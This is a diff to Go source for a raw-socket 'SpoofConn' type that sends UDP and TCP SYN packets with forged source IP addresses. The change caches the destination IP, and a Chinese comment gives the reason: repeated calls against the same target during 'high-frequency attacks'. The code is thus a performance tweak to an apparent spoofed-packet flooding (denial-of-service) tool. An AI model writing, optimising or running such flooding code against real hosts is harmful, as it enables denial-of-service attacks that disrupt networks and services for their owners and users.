@@ -19,6 +19,9 @@ type SpoofConn struct {
 	addr   syscall.SockaddrInet4
 	buf    []byte // reusable send buffer, grows once
 	bufCap int
+	// IP 缓存：避免每次发包都解析
+	cachedDstIP [4]byte
+	cachedDst   string
 }
 
 var spoofBufPool = sync.Pool{
@@ -68,10 +71,23 @@ func (c *SpoofConn) growBuf(need int) {
 }
 
 func (c *SpoofConn) Send(srcIP string, dstIP string, dstPort int, payload []byte) error {
+	// 解析源 IP（每次都要变，无法缓存）
 	src := net.ParseIP(srcIP).To4()
-	dst := net.ParseIP(dstIP).To4()
-	if src == nil || dst == nil {
-		return &net.ParseError{Type: "IP address", Text: srcIP + " or " + dstIP}
+	if src == nil {
+		return &net.ParseError{Type: "IP address", Text: srcIP}
+	}
+
+	// 目标 IP 缓存：高频攻击时同一目标会反复调用
+	var dst net.IP
+	if c.cachedDst == dstIP && c.cachedDstIP[0] != 0 {
+		dst = c.cachedDstIP[:]
+	} else {
+		dst = net.ParseIP(dstIP).To4()
+		if dst == nil {
+			return &net.ParseError{Type: "IP address", Text: dstIP}
+		}
+		copy(c.cachedDstIP[:], dst)
+		c.cachedDst = dstIP
 	}
 
 	udpLen := 8 + len(payload)
@@ -104,10 +120,23 @@ func (c *SpoofConn) Send(srcIP string, dstIP string, dstPort int, payload []byte
 }
 
 func (c *SpoofConn) SendSYN(srcIP, dstIP string, dstPort, srcPort int) error {
+	// 解析源 IP
 	src := net.ParseIP(srcIP).To4()
-	dst := net.ParseIP(dstIP).To4()
-	if src == nil || dst == nil {
-		return &net.ParseError{Type: "IP address", Text: srcIP + " or " + dstIP}
+	if src == nil {
+		return &net.ParseError{Type: "IP address", Text: srcIP}
+	}
+
+	// 目标 IP 缓存
+	var dst net.IP
+	if c.cachedDst == dstIP && c.cachedDstIP[0] != 0 {
+		dst = c.cachedDstIP[:]
+	} else {
+		dst = net.ParseIP(dstIP).To4()
+		if dst == nil {
+			return &net.ParseError{Type: "IP address", Text: dstIP}
+		}
+		copy(c.cachedDstIP[:], dst)
+		c.cachedDst = dstIP
 	}
 
 	const totalLen = 40
